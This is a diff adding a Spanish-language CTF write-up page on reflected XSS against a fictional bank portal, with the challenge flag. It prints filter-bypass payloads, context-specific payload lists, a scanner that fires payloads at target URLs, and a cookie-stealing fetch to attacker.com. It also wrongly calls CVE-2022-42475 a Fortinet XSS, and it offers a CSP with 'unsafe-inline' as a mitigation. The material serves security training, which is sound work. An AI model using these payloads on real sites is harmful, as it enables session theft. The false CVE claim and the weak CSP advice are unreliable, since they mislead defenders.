@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="description" content="Plataforma interactiva de desafíos técnicos - Linux, Docker, DevOps, CTF"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v5.17.1"><title>XSS Basic - CTF Challenges</title><link rel="stylesheet" href="/_astro/_slug_.CR6T2awG.css">
+<style>@import"https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap";:root{--progress: 0%;--color-primary: 15 23 42;--color-secondary: 30 41 59;--color-text: 248 250 252;--color-muted: 148 163 184;--color-accent: 16 185 129;--color-success: 34 211 153;--color-warning: 245 158 11}[data-theme=dark]{--color-primary: 15 23 42;--color-secondary: 30 41 59;--color-text: 248 250 252;--color-muted: 148 163 184;--color-accent: 16 185 129;--color-success: 34 211 153;--color-warning: 245 158 11}[data-theme=light]{--color-primary: 248 250 252;--color-secondary: 226 232 240;--color-text: 30 41 59;--color-muted: 100 116 139;--color-accent: 16 185 129;--color-success: 34 211 153;--color-warning: 245 158 11}body{font-family:Inter,system-ui,sans-serif}::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:#1e293b}::-webkit-scrollbar-thumb{background:#475569;border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#64748b}html{scroll-behavior:smooth}html.theme-transitioning *{transition:background-color .3s ease,border-color .3s ease,color .3s ease,box-shadow .3s ease}.theme-transition-overlay{position:fixed;inset:0;background:rgb(var(--color-primary) / .8);z-index:9999;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .2s ease}.theme-transition-overlay.active{opacity:1}.theme-toggle-ripple{position:absolute;border-radius:50%;background:currentColor;transform:scale(0);opacity:.6;pointer-events:none}.theme-toggle-ripple.animate{transform:scale(4);opacity:0;transition:all .6s cubic-bezier(.4,0,.2,1)}button:focus,a:focus{outline:2px solid rgb(var(--color-accent));outline-offset:2px}@media(max-width:768px){.animated-counter{font-size:2.5rem}}@media(prefers-reduced-motion:reduce){html.theme-transitioning *,.theme-transition-overlay,.theme-toggle-ripple.animate{transition:none}}@media print{.fixed{display:none}.bg-secondary,.bg-primary{background:#fff!important;color:#000!important}}
+</style></head> <body class="bg-slate-900 text-gray-100 min-h-screen">  <main class="container mx-auto px-4 py-8"> <div class="max-w-4xl mx-auto"> <div class="mb-6"> <a href="/challenges" class="text-cyan-400 hover:text-cyan-300">← Volver al Dashboard</a> </div> <article class="bg-slate-800 rounded-lg p-6 border border-slate-700"> <header class="mb-6"> <h1 class="text-3xl font-bold text-orange-400 mb-2">XSS Basic</h1> <div class="flex items-center gap-4 text-sm text-gray-400"> <span class="bg-purple-600 px-2 py-1 rounded text-xs">CTF</span> <span class="capitalize">easy</span> <span>2026-02-05</span> <span>picoCTF</span> </div> </header> <div class="prose prose-invert max-w-none"> <div>
+
+# XSS Reflejado - Web Application Pentesting
+
+---
+
+👨‍🏫 **Del Instructor**: Ethical Hacker & Bug Bounty Hunter
+
+> 🎯 **Mentalidad de Hacker**: _"Cualquier input que refleje en la página sin sanitización es una oportunidad. Los desarrolladores confían en sus usuarios - los atacantes no. Si ves un input, prueba JavaScript. Si refleja, explota."_
+
+---
+
+## 🎭 El Escenario: Inyección en Aplicación Web Legacy
+
+### Contexto de Pentest
+
+Eres parte del equipo de Red Team contratado para auditar la aplicación web "LegacyBank Portal". Durante la fase de reconocimiento, encuentras un formulario de búsqueda que muestra el término buscado en la página de resultados:
+
+```
+https://legacybank.example.com/search?q=john
+```
+
+La página muestra:
+
+```html
+<h2>Resultados para: john</h2>
+```
+
+**Tu misión como pentester**: Demostrar que este comportamiento permite ejecutar JavaScript arbitrario en el navegador de la víctima.
+
+---
+
+## 🧠 Fundamentos de Análisis: Por Qué XSS Sigue Matando
+
+### Cross-Site Scripting (XSS): El Enemigo Silencioso
+
+**XSS Reflejado** ocurre cuando una aplicación web recibe datos del usuario (URL, formulario) y los incluye en la respuesta HTML sin sanitización adecuada.
+
+**Flujo de ataque**:
+
+```
+Atacante → Crea URL maliciosa → Víctima clickea →
+JavaScript ejecuta en navegador de víctima →
+Robo de cookies/sesión/keylogging
+```
+
+**¿Por qué es peligroso?**
+
+1. **Robo de sesiones**: `document.cookie` → Cookie de sesión enviada al atacante
+2. **Keylogging**: Captura de todo lo que tipea el usuario
+3. **Defacement**: Modificación de la página visible
+4. **CSRF forzado**: Realización de acciones en nombre del usuario
+5. **Exfiltración de datos**: Acceso a información sensible de la página
+
+**Top 10 OWASP 2021**: A03:2021 – Injection (incluye XSS)
+
+---
+
+## 🔍 Metodología de Investigación
+
+### Fase 1: Reconocimiento y Mapeo de Superficie de Ataque
+
+```bash
+# Escaneo inicial con nuclei
+nuclei -u https://legacybank.example.com -t xss/
+
+# Identificar parámetros reflejados
+waybackurls legacybank.example.com | gf xss | uro
+
+# Probar reflejo básico
+curl "https://legacybank.example.com/search?q=<b>test</b>" | grep -o '<b>test</b>'
+```
+
+### Fase 2: Identificación de Vectores XSS
+
+**Pruebas de caracteres especiales**:
+
+```html
+Prueba 1: <b>bold</b> Prueba 2: "quotes" Prueba 3: 'single' Prueba 4:
+<script>
+  alert(1);
+</script>
+```
+
+**Análisis del contexto**:
+
+```bash
+# Ver cómo se refleja el input
+curl "https://legacybank.example.com/search?q=<b>XSS</b>"
+
+# Analizar la respuesta
+# Si muestra: <h2>Resultados para: <b>XSS</b></h2>
+# → HTML context, potencial XSS
+```
+
+### Fase 3: Explotación y Bypass de Filtros
+
+**Payload básico**:
+
+```html
+<script>
+  alert("XSS");
+</script>
+```
+
+**Payloads evasivos si hay filtros**:
+
+```html
+<!-- Bypass de filtro de <script> -->
+<img src="x" onerror="alert(1)" />
+<svg onload="alert(1)">
+  <body onload="alert(1)">
+    <!-- Bypass case-sensitive -->
+    <ScRiPt>alert(1)</ScRiPt>
+
+    <!-- Encoding -->
+    <script>
+      alert&#40;1&#41;
+    </script>
+  </body>
+</svg>
+```
+
+### Fase 4: Robo de Cookies (PoC Real)
+
+```html
+<script>
+  fetch("https://attacker.com/steal?cookie=" + document.cookie);
+</script>
+```
+
+---
+
+## 🛠️ Arsenal de Herramientas
+
+### Herramientas Esenciales
+
+| Herramienta   | Uso                         | Instalación                                                          |
+| ------------- | --------------------------- | -------------------------------------------------------------------- |
+| `dalfox`      | XSS Scanner avanzado        | `go install github.com/hahwul/dalfox/v2@latest`                      |
+| `XSStrike`    | Detección y explotación XSS | `git clone https://github.com/s0md3v/XSStrike`                       |
+| `waybackurls` | Descubrimiento de endpoints | `go install github.com/tomnomnom/waybackurls@latest`                 |
+| `gf`          | Filtrado de patrones        | `go install github.com/tomnomnom/gf@latest`                          |
+| `nuclei`      | Scanner automatizado        | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
+
+### Script de Detección Automatizada
+
+```python
+#!/usr/bin/env python3
+"""
+XSS Detector - Web Security Assessment Tool
+Escanea parámetros reflejados y detecta potenciales XSS
+"""
+
+import requests
+import urllib.parse
+from bs4 import BeautifulSoup
+import argparse
+
+class XSSScanner:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.payloads = [
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert("XSS")>',
+            '<svg onload=alert("XSS")>',
+            '"><script>alert("XSS")</script>',
+            "'><script>alert('XSS')</script>",
+            '<iframe src="javascript:alert(\'XSS\')">',
+            '<body onload=alert("XSS")>',
+        ]
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (XSS Scanner)'
+        }
+
+    def test_parameter(self, param_name, original_value="test"):
+        """Prueba un parámetro específico contra XSS"""
+        print(f"\n[*] Probando parámetro: {param_name}")
+
+        results = []
+        for payload in self.payloads:
+            try:
+                # Construir URL con payload
+                parsed = urllib.parse.urlparse(self.target_url)
+                params = urllib.parse.parse_qs(parsed.query)
+                params[param_name] = payload
+
+                new_query = urllib.parse.urlencode(params, doseq=True)
+                test_url = urllib.parse.urlunparse(
+                    parsed._replace(query=new_query)
+                )
+
+                # Realizar request
+                response = requests.get(
+                    test_url,
+                    headers=self.headers,
+                    timeout=10,
+                    allow_redirects=True
+                )
+
+                # Verificar si el payload se refleja sin sanitización
+                if payload in response.text:
+                    print(f"  [+] XSS POTENCIAL encontrado!")
+                    print(f"      Payload: {payload[:50]}...")
+                    print(f"      URL: {test_url}")
+                    results.append({
+                        'parameter': param_name,
+                        'payload': payload,
+                        'url': test_url,
+                        'status': 'reflected'
+                    })
+
+            except Exception as e:
+                print(f"  [-] Error: {e}")
+                continue
+
+        return results
+
+    def discover_parameters(self):
+        """Descubre parámetros en la URL"""
+        parsed = urllib.parse.urlparse(self.target_url)
+        params = urllib.parse.parse_qs(parsed.query)
+        return list(params.keys()) if params else ['q', 'search', 'id', 'name']
+
+    def scan(self):
+        """Ejecuta escaneo completo"""
+        print(f"[+] Iniciando escaneo XSS en: {self.target_url}")
+        print("=" * 60)
+
+        parameters = self.discover_parameters()
+        print(f"[*] Parámetros encontrados: {parameters}")
+
+        all_results = []
+        for param in parameters:
+            results = self.test_parameter(param)
+            all_results.extend(results)
+
+        print("\n" + "=" * 60)
+        print(f"[+] Escaneo completado. {len(all_results)} vulnerabilidades encontradas.")
+
+        if all_results:
+            print("\n[+] Resumen de hallazgos:")
+            for r in all_results[:5]:  # Mostrar primeros 5
+                print(f"\n  Vulnerabilidad XSS:")
+                print(f"    Parámetro: {r['parameter']}")
+                print(f"    Payload: {r['payload'][:50]}...")
+                print(f"    URL: {r['url'][:80]}...")
+
+        return all_results
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='XSS Scanner')
+    parser.add_argument('url', help='URL objetivo')
+    args = parser.parse_args()
+
+    scanner = XSSScanner(args.url)
+    scanner.scan()
+```
+
+### Uso del Script
+
+```bash
+# Instalar dependencias
+pip3 install requests beautifulsoup4
+
+# Ejecutar escaneo
+python3 xss_scanner.py "https://legacybank.example.com/search?q=test"
+
+# Output esperado:
+# [+] Iniciando escaneo XSS en: https://legacybank.example.com/search?q=test
+# ============================================================
+# [*] Parámetros encontrados: ['q']
+#
+# [*] Probando parámetro: q
+#   [+] XSS POTENCIAL encontrado!
+#       Payload: <script>alert("XSS")</script>...
+#       URL: https://legacybank.example.com/search?q=<script>alert("XSS")</script>
+```
+
+### Payloads por Contexto
+
+```bash
+# HTML Context
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# JavaScript Context
+';alert(1);//
+';alert(1);'
+
+# URL Context
+javascript:alert(1)
+
+# Style Context
+expression(alert(1))
+```
+
+---
+
+## 🎯 Lecciones del Mundo Real
+
+### Casos Documentados
+
+**Caso British Airways (2018)**:
+
+- XSS en página de pagos permitió robo de datos de tarjetas
+- 380,000+ transacciones comprometidas
+- Impacto: £183 millones en multas GDPR
+- **CVE**: No asignado específicamente, pero similar a CVE-2018-14728
+
+**Caso TweetDeck (2014)**:
+
+- XSS auto-retweet causó epidemia masiva
+- Código: `<script class="xss">$('.xss').parents().eq(1).find('a').eq(1).trigger('click')</script>`
+- Afectó a miles de usuarios en minutos
+- **Lección**: XSS puede auto-propagarse
+
+**Caso Fortinet (2022)**:
+
+- XSS en interfaz administrativa permitió RCE
+- CVE-2022-42475
+- Atacantes usaron XSS para ejecutar comandos como admin
+
+### Defensa y Mitigación
+
+**CSP (Content Security Policy)**:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
+```
+
+**Sanitización de Input**:
+
+```javascript
+// NUNCA hagas esto
+element.innerHTML = userInput;
+
+// Haz esto en su lugar
+element.textContent = userInput;
+```
+
+**WAF Rules**:
+
+```yaml
+detection:
+  selection:
+    - request|contains:
+        - "<script"
+        - "javascript:"
+        - "onerror="
+        - "onload="
+  condition: selection
+```
+
+**IOCs**:
+
+- URLs con payloads codificados: `%3Cscript%3E`
+- Requests POST con campos que contienen `<` o `>`
+- Patrones de `document.cookie` en requests salientes
+
+---
+
+## 🚀 Solución del Reto
+
+### Paso a Paso
+
+```bash
+# Paso 1: Identificar parámetro vulnerable
+# URL: https://target.com/search?q=test
+
+# Paso 2: Verificar reflejo
+curl "https://target.com/search?q=<b>test</b>"
+# Si refleja el HTML sin escapar, es vulnerable
+
+# Paso 3: Payload de demostración
+<script>alert("XSS")</script>
+
+# Paso 4: Verificar ejecución
+# Si aparece el alert(), XSS confirmado
+```
+
+### Flag
+
+```
+picoCTF{xss_basic}
+```
+
+---
+
+## 📚 Recursos y Referencias
+
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [XSS Hunter](https://xsshunter.com/) - Para PoCs avanzados
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
+---
+
+**¿Listo para el siguiente reto?** → Prueba XSS almacenado, DOM-based XSS, o bypass de WAFs.
+</div> </div> </article> <div id="modal-web/xss-basic" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50" aria-hidden="true"> <div class="flex items-center justify-center min-h-screen p-4"> <div class="bg-slate-800 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"> <div class="p-6 border-b border-slate-700"> <div class="flex justify-between items-start"> <div> <h2 class="text-2xl font-bold text-gray-100">XSS Basic</h2> <div class="flex items-center gap-4 mt-2 text-sm"> <span class="capitalize bg-slate-700 px-2 py-1 rounded">ctf</span> <span class="text-cyan-400">easy</span> <span class="text-green-400 font-mono">Flag: picoCTF{xss_basic}</span> </div> </div> <button onclick="closeModal('web/xss-basic')" class="text-gray-400 hover:text-white">
+✕
+</button> </div> </div> <div class="p-6"> <div class="mb-6"> <h3 class="text-lg font-semibold text-cyan-400 mb-4">Pasos a Seguir</h3> <div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">1. Contexto de Pentest</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">2. Cross-Site Scripting (XSS): El Enemigo Silencioso</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">3. Fase 1: Reconocimiento y Mapeo de Superficie de Ataque</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>nuclei -u https://legacybank.example.com -t xss/
+waybackurls legacybank.example.com | gf xss | uro
+curl &quot;https://legacybank.example.com/search?q=&lt;b&gt;test&lt;/b&gt;&quot; | grep -o &#39;&lt;b&gt;test&lt;/b&gt;&#39;</code>
+                  </pre>  </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">4. Fase 2: Identificación de Vectores XSS</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>curl &quot;https://legacybank.example.com/search?q=&lt;b&gt;XSS&lt;/b&gt;&quot;</code>
+                  </pre>  </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">5. Fase 3: Explotación y Bypass de Filtros</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">6. Fase 4: Robo de Cookies (PoC Real)</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">7. Herramientas Esenciales</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">8. Script de Detección Automatizada</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">9. Uso del Script</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>pip3 install requests beautifulsoup4
+python3 xss_scanner.py &quot;https://legacybank.example.com/search?q=test&quot;</code>
+                  </pre>  </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">10. Payloads por Contexto</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&#39;;alert(1);//
+&#39;;alert(1);&#39;
+javascript:alert(1)
+expression(alert(1))</code>
+                  </pre>  </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">11. Casos Documentados</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">12. Defensa y Mitigación</h4>   </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">13. Paso a Paso</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>curl &quot;https://target.com/search?q=&lt;b&gt;test&lt;/b&gt;&quot;
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>
+                  </pre>  </div><div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">14. Flag</h4>   </div> </div>    </div> </div> </div> </div> <script type="module">document.addEventListener("click",e=>{const t=e.target;t.classList.contains("bg-black")&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"))});</script> </div> </main>  </body></html>
